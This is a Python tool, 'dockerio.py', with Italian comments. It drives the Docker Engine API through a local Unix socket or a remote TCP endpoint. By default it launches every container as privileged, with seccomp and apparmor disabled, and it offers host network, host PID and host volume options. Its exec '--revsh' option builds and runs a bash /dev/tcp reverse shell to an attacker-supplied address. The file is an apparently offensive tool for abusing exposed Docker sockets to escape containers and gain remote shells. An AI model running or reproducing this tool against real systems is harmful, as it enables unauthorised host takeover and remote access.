import sys, os,time
import socket,requests,json,pprint

from urllib3.connection import HTTPConnection
from urllib3.connectionpool import HTTPConnectionPool
from requests.adapters import HTTPAdapter


class UnixConnection(HTTPConnection):
    def __init__(self):
        super().__init__("localhost")

    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.connect("/run/docker.sock")


class UnixConnectionPool(HTTPConnectionPool):
    def __init__(self):
        super().__init__("localhost")

    def _new_conn(self):
        return UnixConnection()


class UnixAdapter(HTTPAdapter):
    def get_connection(self, url, proxies=None):
        return UnixConnectionPool()






def help():
    print("\nUso:")
    print("\tdockerio.py [UNIX|TCP] [HOST_ADDR] run [image_name] [container_name] [-v? [host_path:cont_path]] [-d?] [--hostnet?] [--hostpid?] [--rm?] [--cmd? [comando]]")
    print("\tdockerio.py [UNIX|TCP] [HOST_ADDR] exec [container_name] [--cmd [comando] | --it-cmd [comando] | --revsh [ip_addr:port]]")
    print("\tdockerio.py [UNIX|TCP] [HOST_ADDR] ps ")
    print("\tdockerio.py [UNIX|TCP] [HOST_ADDR] ps [container_name|container_hash]")
    print("\tdockerio.py [UNIX|TCP] [HOST_ADDR] ps rm [container_name|container_hash]")
    print("\tdockerio.py [UNIX|TCP] [HOST_ADDR] images ")
    print("\tdockerio.py [UNIX|TCP] [HOST_ADDR] image  [name|hash]")
    print("\tdockerio.py [UNIX|TCP] [HOST_ADDR] image rm [image_name]")
    print("\tdockerio.py [UNIX|TCP] [HOST_ADDR] image load [repo_name] [image_source]")
    print("\tdockerio.py [UNIX|TCP] [HOST_ADDR] info")
    print("\tdockerio.py [UNIX|TCP] [HOST_ADDR] events")
    print()
    print("Di default, ogni container è avviato in modalità \"Privileged\" ")
    
    




run_data = {
    #"HostName":"",  
    #    "DomainName":"",  
    #    "User":"",  
        "AttachStdin":True,  
        "AttachStdout":True,  
        "AttachStderr":True,  
        "Tty":True,  
        "OpenStdin":True,  
        #"StdinOnce":True,    
        "Image": "",  
        "Volumes": {},  
        "HostConfig":{ 
            "Binds": [],
            "PortBindings":{},
            "ExposedPorts":{},
            "AutoRemove":False,
            "Privileged":True
            },
        #"Cmd":[]
        } #disabilita seccomp,apparmor e aggiunge capabilities



exec_data = {
    "AttachStdin":True,
 "AttachStdout":True,
"AttachStderr":True,
"ProcessConfig": {"privileged":True},
"Tty":False,
"Cmd":[]
}




def parse_cmd(stringa):
    parsed = []
    isastring = False

    for x in stringa.split():
        if isastring:
            parsed[-1] += " "+x
        else:
            parsed.append(x)
        if '\"' in x:
            isastring = not isastring
    
    for i in range(len(parsed)):
        parsed[i] = parsed[i].replace("\"","")
        
    return parsed


def prepare_run_data(dict_struct,image,args_list):
    
    print(args_list)
    dict_struct["Image"] = image
    for i in range(0,len(args_list)):
        if args_list[i] == "--cmd":
            dict_struct["Cmd"] = parse_cmd(" ".join(args_list[i+1:]))
        if args_list[i] == "-v":
            dict_struct["Volumes"][args_list[i+1].split(":")[1]+str("/")] = {}
            dict_struct["HostConfig"]["Binds"].append(args_list[i+1])
        if args_list[i] == "--hostnet":
            dict_struct["HostConfig"]["NetworkMode"] = "host"
        if args_list[i] == "--hostpid":
            dict_struct["HostConfig"]["PidMode"] = "host"
        if args_list[i] == "-d":
            dict_struct["Detached"] = True
        if args_list[i] == "--rm":
            dict_struct["HostConfig"]["AutoRemove"] = True
    
    pprint.pprint(dict_struct)

    return dict_struct


def prepare_exec_data(dict_struct,args_list):

    if args_list[0] == "--it-cmd":
        dict_struct["Cmd"] = parse_cmd(" ".join(args_list[1:]))
        dict_struct["Tty"] = True
    if args_list[0] == "--cmd":
        dict_struct["Cmd"] = parse_cmd(" ".join(args_list[1:]))
    elif args_list[0] == "--revsh":
        dest_host = args_list[1].split(":")[0]
        dest_port = args_list[1].split(":")[1]
        zsh_revsh = "/bin/bash -c \"/bin/bash -i >& /dev/tcp/{}/{} 0>&1 2>&1\"".format(dest_host, dest_port)
        dict_struct["Cmd"] = parse_cmd(zsh_revsh)
        dict_struct["Tty"] = True

    pprint.pprint(dict_struct)

    return dict_struct



def pretty_print(response):

    if isinstance(response,dict):
        pprint.pprint(response)
    else:    
        for jsn in response:
            pprint.pprint(jsn)
            print()





if __name__ == "__main__":

    session = requests.Session()
    HOST_ADDR = "http://localhost"
    len_argv = len(sys.argv)

    try:
        for i in range(1,len_argv):

            arg = sys.argv[i]

        
            if i==1:
                if arg == "UNIX":
                    session.mount("http://", UnixAdapter())
                elif arg == "TCP":
                    HOST_ADDR = "https://"+str(sys.argv[2])
                else:
                    raise Exception("socket?")
                # stackoverflow.com/questions/26964595/whats-the-correct-way-to-use-a-unix-domain-socket-in-requests-framework

            elif i == 3:
                #run,exec,ps,image,images
                if arg == "run":
                    response = session.post("{}/containers/create?name={}".format(HOST_ADDR , sys.argv[5] ) , json=prepare_run_data(run_data,sys.argv[4],sys.argv[6:]) )
                    pretty_print(response.json())
                    response = session.post("{}/containers/{}/start".format(HOST_ADDR,response.json()["Id"]) )
                    print(response)
                    break

                elif arg == "exec":

                    response = session.post("{}/containers/{}/exec".format(HOST_ADDR , sys.argv[4] ) , json=prepare_exec_data(exec_data , sys.argv[5:]))
                    pretty_print(response.json())
                    tty = (sys.argv[5] == "--revsh" or sys.argv[5] == "--it-cmd")
                    response = session.post("{}/exec/{}/start".format(HOST_ADDR ,response.json()["Id"]) , json={"Detach":False,"Tty":tty})
                    print(response.content)
                    break
                    
                elif arg == "ps":
                    #query per visualizzare tutti i container attivi
                    if len_argv == 4:
                        response = session.get("{}/containers/json".format(HOST_ADDR))
                        pretty_print(response.json())
                        break
                    elif sys.argv[4] == "rm":
                        response = session.post("{}/containers/{}/stop".format(HOST_ADDR , sys.argv[5] ))
                        response = session.delete("{}/containers/{}".format(HOST_ADDR , sys.argv[5] ))
                        break
                    elif len_argv == 5:
                        response = session.get("{}/containers/{}/json".format(HOST_ADDR, sys.argv[4]))
                        pretty_print(response.json())
                        break

                elif arg == "image":
                    if len_argv == 5:
                        response = session.get("{}/images/{}/json".format(HOST_ADDR , sys.argv[4] ))
                        pretty_print(response.json())
                        break
                    elif sys.argv[4] == "rm":
                        response = session.delete("{}/images/{}".format(HOST_ADDR , sys.argv[5] ))
                        break
                    if sys.argv[4] == "load":
                        #query per caricare un'immagine
                        response = session.post("{}/images/create?repo={}&fromSrc={}".format(HOST_ADDR , sys.argv[5], sys.argv[6] ))
                        print(response)
                        break
                elif arg == "images":
                    #query per visualizzare tutte le immagini presenti
                    response = session.get("{}/images/json".format(HOST_ADDR))
                    pretty_print(response.json())
                    break
                elif arg == "info":
                    #query per visualizzare le informazioni
                    print()
                    print("#####informazioni relative all'engine:")
                    response = session.get("{}/version".format(HOST_ADDR))
                    pretty_print(response.json())
                    print()
                    print("#####dettagli host:")
                    response = session.get("{}/info".format(HOST_ADDR))
                    pretty_print(response.json())
                    break
                elif arg == "events":
                    response = session.get("{}/events".format(HOST_ADDR))
                    pretty_print(response.json())
                    break

    

    except Exception as e:
        print(str(e))
        help()
    finally:
        session.close()

    #l'attach si può ottenere anche semplicemente con socat!! (quest'approccio invece è scomodo)
    #oppure websockets

    
        

    
    